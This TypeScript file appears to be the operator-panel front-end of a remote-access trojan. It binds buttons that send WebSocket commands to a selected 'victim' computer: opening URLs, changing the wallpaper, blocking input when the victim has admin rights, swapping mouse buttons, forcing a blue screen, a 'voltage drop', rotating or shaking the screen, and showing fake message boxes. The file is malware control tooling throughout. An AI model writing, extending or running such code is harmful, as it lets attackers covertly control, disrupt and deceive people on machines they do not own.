import type { QueryClient } from "@tanstack/react-query";

import type { Victim } from "../../../../api/victims";
import { showToast } from "../../../../toast";
import { isVictimOnline } from "../../../utils/victim-status";

type PanelWsLike = {
    state: string;
    sendJson: (payload: Record<string, unknown>) => boolean;
};

export function bindRoflActions(p: {
    selectedVictimId: string | null;
    qc: QueryClient;
    ws: PanelWsLike;
}): (() => void) | void {
    const { selectedVictimId, qc, ws } = p;

    const urlInput = document.getElementById("roflUrlInput") as HTMLInputElement | null;
    const openBtn = document.getElementById("roflOpenBtn") as HTMLButtonElement | null;

    const bgInput = document.getElementById("roflBgUrlInput") as HTMLInputElement | null;
    const bgBtn = document.getElementById("roflChangeBtn") as HTMLButtonElement | null;

    const blockOnBtn = document.getElementById("roflBlockOnBtn") as HTMLButtonElement | null;
    const blockOffBtn = document.getElementById("roflBlockOffBtn") as HTMLButtonElement | null;

    const shakeOnBtn = document.getElementById("roflShakeOnBtn") as HTMLButtonElement | null;
    const shakeOffBtn = document.getElementById("roflShakeOffBtn") as HTMLButtonElement | null;

    const swapLeftRightBtn = document.getElementById("roflSwapLeftRightBtn") as HTMLButtonElement | null;
    const swapRightLeftBtn = document.getElementById("roflSwapRightLeftBtn") as HTMLButtonElement | null;

    const bsodBtn = document.getElementById("roflBsodBtn") as HTMLButtonElement | null;
    const voltageBtn = document.getElementById("roflVoltageBtn") as HTMLButtonElement | null;

    const flip0Btn = document.getElementById("roflFlip0Btn") as HTMLButtonElement | null;
    const flip90Btn = document.getElementById("roflFlip90Btn") as HTMLButtonElement | null;
    const flip180Btn = document.getElementById("roflFlip180Btn") as HTMLButtonElement | null;
    const flip270Btn = document.getElementById("roflFlip270Btn") as HTMLButtonElement | null;

    const msgIconSelect = document.getElementById("roflMsgIcon") as HTMLSelectElement | null;
    const msgHeaderInput = document.getElementById("roflMsgHeader") as HTMLInputElement | null;
    const msgContentInput = document.getElementById("roflMsgContent") as HTMLTextAreaElement | null;
    const msgButtonsSelect = document.getElementById("roflMsgButtons") as HTMLSelectElement | null;
    const msgSendBtn = document.getElementById("roflMsgSendBtn") as HTMLButtonElement | null;

    if (!urlInput || !openBtn) return;

    let roflFloodUntil = 0;
    let roflWindowStart = 0;
    let roflCmdCount = 0;

    const isValidUrl = (value: string): boolean => {
        const raw = String(value || "").trim();
        if (!raw) {
            showToast("warning", "Enter URL");
            return false;
        }
        try {
            if (!/^https?:\/\//i.test(raw)) {
                throw new Error("no scheme");
            }
            const u = new URL(raw);
            const host = String(u.hostname || "").trim();
            if (!host || !host.includes(".") || !/[a-zA-Z]/.test(host)) {
                throw new Error("bad host");
            }
            return true;
        } catch {
            showToast("error", "Invalid URL format");
            return false;
        }
    };

    const ensureVictim = (): string | null => {
        const victimId = selectedVictimId;
        if (!victimId) {
            showToast("error", "Select victim first");
            return null;
        }
        return String(victimId);
    };

    const getSelectedVictim = (): Victim | null => {
        const victimId = selectedVictimId;
        if (!victimId) return null;
        const data = qc.getQueryData(["victims"]);
        const list = Array.isArray(data) ? (data as Victim[]) : [];
        const v = list.find((x) => String((x as { id?: unknown }).id || "") === String(victimId));
        return v || null;
    };

    const ensureVictimOnline = (): boolean => {
        try {
            const victim = getSelectedVictim();
            if (victim && !isVictimOnline(victim)) {
                showToast("error", "Victim offline");
                return false;
            }
        } catch {
        }
        return true;
    };

    const ensureVictimAdmin = (): boolean => {
        try {
            const victim = getSelectedVictim();
            const admin = victim ? (victim as { admin?: unknown }).admin : undefined;
            if (!victim || admin !== true) {
                showToast("error", "No administrator rights");
                return false;
            }
        } catch {
            showToast("error", "No administrator rights");
            return false;
        }
        return true;
    };

    const ensureWs = (): boolean => {
        if (ws.state !== "open") {
            showToast("error", "WebSocket is not connected");
            return false;
        }
        return true;
    };

    const sendCommand = (cmd: string, successText?: string) => {
        if (!ensureWs()) return false;
        const victimId = ensureVictim();
        if (!victimId) return false;

        const ok = ws.sendJson({
            type: "command",
            victim_id: String(victimId),
            command: String(cmd || ""),
        });

        if (!ok) {
            showToast("error", "Failed to send command");
            return false;
        }
        if (successText) {
            showToast("success", successText);
        }
        return true;
    };

    const onOpen = () => {
        const raw = String(urlInput.value || "").trim();
        if (!isValidUrl(raw)) return;
        if (!ensureWs()) return;
        if (!ensureVictimOnline()) return;
        const victimId = ensureVictim();
        if (!victimId) return;

        const ok = sendCommand(raw, "Open url command sent");
        if (ok) urlInput.value = "";
    };

    const onBlockOn = () => {
        if (!ensureWs()) return;
        if (!ensureVictimAdmin()) return;
        const ok = sendCommand("block_input_on", "Block input: ON");
        if (!ok) return;
        try {
            blockOnBtn?.classList.add("active");
            blockOffBtn?.classList.remove("active");
        } catch {
        }
    };

    const onBlockOff = () => {
        if (!ensureWs()) return;
        if (!ensureVictimAdmin()) return;
        const ok = sendCommand("block_input_off", "Block input: OFF");
        if (!ok) return;
        try {
            blockOffBtn?.classList.add("active");
            blockOnBtn?.classList.remove("active");
        } catch {
        }
    };

    const onBg = () => {
        if (!bgInput || !bgBtn) return;
        const raw = String(bgInput.value || "").trim();
        if (!isValidUrl(raw)) return;
        if (!ensureWs()) return;
        if (!ensureVictimOnline()) return;
        const ok = sendCommand(`bg:${raw}`, "Change background command sent");
        if (ok) bgInput.value = "";
    };

    const onMsg = () => {
        if (!msgSendBtn) return;
        if (!ensureWs()) return;
        if (!ensureVictimOnline()) return;
        const iconVal = msgIconSelect && msgIconSelect.value ? String(msgIconSelect.value).trim() : "info";
        const buttonsVal = msgButtonsSelect && msgButtonsSelect.value ? String(msgButtonsSelect.value).trim() : "ok";
        const headerVal = msgHeaderInput && msgHeaderInput.value ? String(msgHeaderInput.value).trim() : "";
        const contentVal = msgContentInput && msgContentInput.value ? String(msgContentInput.value).trim() : "";
        const cmd = `msgbox|${iconVal}|${buttonsVal}|${headerVal}|${contentVal}`;
        sendCommand(cmd, "Command sent successfully.");
    };

    const sendSwapCommand = (cmd: string, successText: string) => {
        if (!ensureWs()) return false;
        if (!ensureVictimOnline()) return false;
        return sendCommand(cmd, successText);
    };

    const sendSimpleRoflCommand = (cmd: string, successText: string) => {
        const now = Date.now();
        if (now < roflFloodUntil) {
            showToast("error", "Don't flood");
            return false;
        }
        if (!roflWindowStart || now - roflWindowStart > 3000) {
            roflWindowStart = now;
            roflCmdCount = 0;
        }
        roflCmdCount += 1;
        if (roflCmdCount > 5) {
            roflFloodUntil = now + 10000;
            showToast("error", "Don't flood");
            return false;
        }

        if (!ensureWs()) return false;
        if (!ensureVictimOnline()) return false;
        return sendCommand(cmd, successText);
    };

    openBtn.addEventListener("click", onOpen);
    if (blockOnBtn) blockOnBtn.addEventListener("click", onBlockOn);
    if (blockOffBtn) blockOffBtn.addEventListener("click", onBlockOff);
    if (bgBtn) bgBtn.addEventListener("click", onBg);
    if (msgSendBtn) msgSendBtn.addEventListener("click", onMsg);
    if (swapLeftRightBtn) {
        swapLeftRightBtn.addEventListener("click", () => {
            sendSwapCommand("swap_mouse_left_right", "Mouse buttons set: Left | Right");
        });
    }
    if (swapRightLeftBtn) {
        swapRightLeftBtn.addEventListener("click", () => {
            sendSwapCommand("swap_mouse_right_left", "Mouse buttons set: Right | Left");
        });
    }
    if (bsodBtn) {
        bsodBtn.addEventListener("click", () => {
            sendSimpleRoflCommand("bsod", "BSoD command sent");
        });
    }
    if (voltageBtn) {
        voltageBtn.addEventListener("click", () => {
            sendSimpleRoflCommand("voltage_drop", "Voltage drop command sent");
        });
    }
    if (flip0Btn) {
        flip0Btn.addEventListener("click", () => {
            sendSimpleRoflCommand("flip_screen_0", "Screen rotation: 0°");
        });
    }
    if (flip90Btn) {
        flip90Btn.addEventListener("click", () => {
            sendSimpleRoflCommand("flip_screen_90", "Screen rotation: 90°");
        });
    }
    if (flip180Btn) {
        flip180Btn.addEventListener("click", () => {
            sendSimpleRoflCommand("flip_screen_180", "Screen rotation: 180°");
        });
    }
    if (flip270Btn) {
        flip270Btn.addEventListener("click", () => {
            sendSimpleRoflCommand("flip_screen_270", "Screen rotation: 270°");
        });
    }
    if (shakeOnBtn) {
        shakeOnBtn.addEventListener("click", () => {
            const ok = sendSimpleRoflCommand("shake_on", "Shake screen: ON");
            if (!ok) return;
            try {
                shakeOnBtn.classList.add("active");
                shakeOffBtn?.classList.remove("active");
            } catch {
            }
        });
    }
    if (shakeOffBtn) {
        shakeOffBtn.addEventListener("click", () => {
            const ok = sendSimpleRoflCommand("shake_off", "Shake screen: OFF");
            if (!ok) return;
            try {
                shakeOffBtn.classList.add("active");
                shakeOnBtn?.classList.remove("active");
            } catch {
            }
        });
    }

    return () => {
        openBtn.removeEventListener("click", onOpen);
        if (blockOnBtn) blockOnBtn.removeEventListener("click", onBlockOn);
        if (blockOffBtn) blockOffBtn.removeEventListener("click", onBlockOff);
        if (bgBtn) bgBtn.removeEventListener("click", onBg);
        if (msgSendBtn) msgSendBtn.removeEventListener("click", onMsg);
    };
}
